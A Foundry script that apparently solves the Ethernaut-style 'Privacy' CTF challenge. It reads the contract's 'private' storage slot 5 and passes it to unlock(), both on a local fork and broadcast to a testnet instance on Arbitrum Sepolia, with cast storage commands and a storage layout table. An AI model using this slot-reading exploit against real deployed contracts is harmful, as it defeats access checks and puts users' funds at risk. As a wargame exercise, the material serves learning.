// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

// cast interface src/Privacy.sol:Privacy
interface IPrivacy {
    function ID() external view returns (uint256);
    function locked() external view returns (bool);
    function unlock(bytes16 _key) external;
}

// $ forge script script/PrivacyExp.s.sol:ForkExp
// $ forge script script/PrivacyExp.s.sol:ForkExp --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
contract ForkExp is Script {
    IPrivacy public contractInstance;
    address deployer = makeAddr("deployer"); // 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946
    address attacker = makeAddr("attacker"); // 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e

    function run() external {
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        bytes32[3] memory data;
        data[0] = bytes32(uint256(0));
        data[1] = bytes32(uint256(1));
        data[2] = bytes32(uint256(2));

        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IPrivacy(address(new Privacy(data)));
            vm.stopPrank();
        } else if (chainId == 421614) {
            contractInstance = IPrivacy(payable(0x06A359364e98C7a50ED881F560cFFf924fe0827E));
        } else {
            return;
        }
        vm.startPrank(attacker);
        // cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 5 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL
        bytes32 data2 = vm.load(address(contractInstance), bytes32(uint256(5)));
        contractInstance.unlock(bytes16(data2));
        require(!contractInstance.locked(), "contract is still locked");
        vm.stopPrank();
    }
}

// forge inspect Privacy storage
// ╭--------------+------------+------+--------+-------+-------------------------╮
// | Name         | Type       | Slot | Offset | Bytes | Contract                |
// +=============================================================================+
// | locked       | bool       | 0    | 0      | 1     | src/Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+-------------------------|
// | ID           | uint256    | 1    | 0      | 32    | src/Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+-------------------------|
// | flattening   | uint8      | 2    | 0      | 1     | src/Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+-------------------------|
// | denomination | uint8      | 2    | 1      | 1     | src/Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+-------------------------|
// | awkwardness  | uint16     | 2    | 2      | 2     | src/Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+-------------------------|
// | data         | bytes32[3] | 3    | 0      | 96    | src/Privacy.sol:Privacy |
// ╰--------------+------------+------+--------+-------+-------------------------╯
// 固定长度的数组会从声明变量所在的插槽起始位置开始顺序连续存储所有元素
// cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 0 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL //locked
// cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 3 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL //data[0]
// cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 4 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL //data[1]
// cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 5 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL //data[2] //0x26a593fe69120890e8cf9709fae2a9264c63dbbe7f0173d1445b49e3a5af59c3
// $ forge script script/PrivacyExp.s.sol:onChainExp --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
// $ forge script script/PrivacyExp.s.sol:onChainExp --rpc-url $ARBITRUM_SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make privacyExp ARGS='--network arbiSepolia'
contract onChainExp is Script {
    IPrivacy public contractInstance = IPrivacy(0x06A359364e98C7a50ED881F560cFFf924fe0827E);

    function run() external {
        vm.startBroadcast();
        // cast storage 0x06A359364e98C7a50ED881F560cFFf924fe0827E 5 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL
        bytes32 data2 = vm.load(address(contractInstance), bytes32(uint256(5)));
        contractInstance.unlock(bytes16(data2));
        require(!contractInstance.locked(), "contract is still locked");
        vm.stopBroadcast();
    }
}
